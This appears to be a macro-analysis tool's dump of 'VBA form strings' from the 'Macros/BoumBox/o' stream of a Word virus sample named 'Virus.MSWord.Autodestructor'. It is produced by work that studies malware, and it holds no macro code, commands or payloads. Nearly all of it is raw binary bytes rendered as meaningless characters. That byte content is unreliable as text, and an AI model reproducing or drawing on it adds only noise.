- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f33f3ff3�f3�f3��3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�3f�3��3̙3��3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�3f�3��3��3��3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�3f�3��3��3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3f33ff3f�3f�3f�ff
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ff3fffff�ff�ff��f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�ff�f��f̙f��f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�ff�f��f��f��f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�ff�f��f��f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�33�f3��3��3��f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�ff��f��f����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�����̙��̙
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3̙f̙�̙�̙���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�33�f3̙3��3��f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�ff̙f��f����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�̙��̙����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�̙��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�̙������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�33�f3��3��3��f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�ff��f��f����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�����̙����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*\Ȱ�Ç
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#J�H��ŋ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3j�ȱ�Ǐ C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I��ɓ(S�\ɲ�˗0cʜI��͛8s��ɳ�ϟ@�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J��ѣH�*]ʴ�ӧD�]�J��@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z��T�4iZ��5��+ر.â}(��ٯjעt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W.²o��M�V�ރx���K��ٺr�
΋��G�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s���㑐
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'�\y�叜5�����gХMSU�Z���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CW~MVv볰9ڞݔ��ȹ7��L��o✋Sl�u����s��=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8����
l��y��5��#�������uzo�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���>2w����$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}������}=yW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&�'��!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:8�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2'���A����%(`�$vd z#�T�x'VآC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G K/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2Vc|�#u;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�0�8�T���H=��$fOBI��JV)���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i��Q�Ɨ�pj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�5z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�t$�p�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^�y�����|��'��Zy#�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*�(�m:�&r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ے�qZ��8b*鉛.�!o�-�b��ID�5��I��xj�j��z�(��Қ!���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����J%��.�c�iA���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*tk��ک��CF���`VKl��&jж�v�+`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+�זk��C�{lV�J5���6{U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K/�ֹg-���/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
{o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K��y�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w�/ǥ�,rʡ�,3��j,��-�r��݌���+4�4�F�p'f��ϫ�|t�q�z��9'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]i�]_���+�,����X�R���a����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
++��Yk�5��m��6��ݝk���-8�y�|a�K���Mu� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8݊/η����t�O�)��m��s2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xĞ�Vy��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
uаc�xy8���ŭ��z�s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i5�xc��M���z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?x��w�4� rM���s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�o_��:#���73���ß�~���>~�巬���Ϗ���<�سi?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e���i�lF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h;�)(�k^蔧@1���ӛq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h���� � �ڧ?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
����m�z�[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9ݛ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kWCjݐ��;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�BL�ЈfãD0�J���z�C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R�"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@����b�"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �1�TD�R�ȿ7�p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�$�1�^��	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D<"Ɍ{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#!ghȲ�э����P��/FR�_���J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K��qq
$�<�Bυr(tD")�׺��2��\���wJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̞��hD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~���w�B�_�2��^�`h�\"S���^3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Lh�$�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cdf��ě
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A.6�M}S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c+˦��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���W<�uNy�sQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1X>�yO|��y�t�~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O��ˠ��gB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z�k��dhC�EK��'Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZN~:4��l�BE�Q=}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�+fԞ%5iJ#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S��t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��M;*Ӛ�T���NK�yЛ�T����O��S�vӣ�4��zfQ񹴨5��VC�U��4�=��I�:ՖQRa{��ZAJ��U�O��R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JV�R���S�Z�:W�r��ouk8S�M��T�!3����׿Γ�!sh`��Ӎ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����+ eB'�*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'�,b+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U���ifWz��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�a]��j�
�Ѧ���=�_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z������)O��V����ly��af%V���OE�[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8�h9S�U�=MT@��*�ZO�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w��-�=��P`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
UHê[,��O�r����h~���c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ιa�%��[��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8�K��:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�|�F��&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�XU�Q�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���k�ݚ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%��;Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C��|�+�ol^�*��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ل�T�֍�r��b��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p�b��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#$�WN0M5��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v��Ɔ��ƴE���M{_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̬��L��i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0���J;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_j���KE�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ҍ �|�)w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ͼ�Ȧ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
қ�3�rXh�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
2�X���}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Autodestructor' - OLE stream: 'Macros/BoumBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ժ)�h0W
